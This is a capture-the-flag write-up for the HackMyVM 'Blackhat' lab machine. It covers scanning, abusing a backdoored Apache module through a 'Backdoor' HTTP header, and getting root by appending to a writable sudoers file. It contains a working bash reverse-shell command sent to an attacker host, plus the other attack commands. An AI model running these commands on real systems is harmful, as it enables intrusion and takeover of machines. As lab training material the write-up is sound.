---
layout: post
title: "HackMyVM - Blackhat"
date: 2022-11-25 02:10:00 +0100
categories: hmv
tag: ["Apache", "RCE"]
---
# HackMyVM > Blackhat

Creator: [cromiphi](https://hackmyvm.eu/profile/?user=cromiphi)
Level: Easy
Release Date: 2022-11-24

## Scan

```bash
$ nmap -sC -sV -oA scans/Blackhat -p- 192.168.1.17 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-25 01:25 WET
Nmap scan report for 192.168.1.17
Host is up (0.00032s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title:  Hacked By HackMyVM
|_http-server-header: Apache/2.4.54 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.72 seconds
```

## Enumeration

### Gobuster (Directories)

```bash
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.1.17 -x php,html,txt,jpg -o scans/gobuster-medium.log
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.17
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,html,txt,jpg
[+] Timeout:                 10s
===============================================================
2023/03/25 17:26:59 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 1437]
/image.jpg            (Status: 200) [Size: 13314]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/phpinfo.php          (Status: 200) [Size: 69318]
/server-status        (Status: 403) [Size: 277]
Progress: 1102055 / 1102805 (99.93%)
===============================================================                                                                                                        
2022/11/25 01:32:42 Finished                                                                                                                                           
=============================================================== 
```

### Server

```
$ nikto -h http://192.168.1.17/ -C all -output scans/nikto-192.168.1.17.html -Format HTML
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.1.17
+ Target Hostname:    192.168.1.17
+ Target Port:        80
+ Start Time:         2022-11-25 01:35:12 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.54 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Server may leak inodes via ETags, header found with file /, inode: 59d, size: 5edce4c6f946a, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .
+ /phpinfo.php: Output from the phpinfo() function was found.
+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
+ 26640 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2022-11-25 01:35:12 (GMT0) (58 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

<img src="https://drive.google.com/uc?id=1FRtxlJOewvN-uYt6UTJGW26-0S0JcVOa"/>

## [Apache Backdoor MOD](https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor)

* RCE

```bash
$ curl -H "Backdoor: id" http://192.168.1.17 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

* Reverse Shell

```bash
$ curl -H "Backdoor: bash -c 'bash -i >& /dev/tcp/192.168.1.6/4444 0>&1'" http://192.168.1.17
```

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.17] 56210
bash: cannot set terminal process group (418): Inappropriate ioctl for device
bash: no job control in this shell
www-data@blackhat:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@blackhat:/$ 
```

## Priviledge Escalation (www-data > darkdante)

```bash
www-data@blackhat:/var/www/html$ ls /home
ls /home
darkdante
www-data@blackhat:/var/www/html$ sudo - darkdante
sudo - darkdante

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required

www-data@blackhat:/var/www/html$ su - darkdante
su - darkdante
id
uid=1000(darkdante) gid=1000(darkdante) groups=1000(darkdante)
```

## Root

* sudoers write permission

```bash
darkdante@blackhat:/$ getfacl /etc/sudoers
getfacl /etc/sudoers
getfacl: Removing leading '/' from absolute path names
# file: etc/sudoers
# owner: root
# group: root
user::r--
user:darkdante:rw-
group::r--
mask::rw-
other::---
```

```
darkdante@blackhat:/$ echo "darkdante ALL=(ALL:ALL) ALL" >> /etc/sudoers
darkdante@blackhat:/$ sudo su

$ id
$ uid=0(root) gid=0(root) groups=0(root)
```
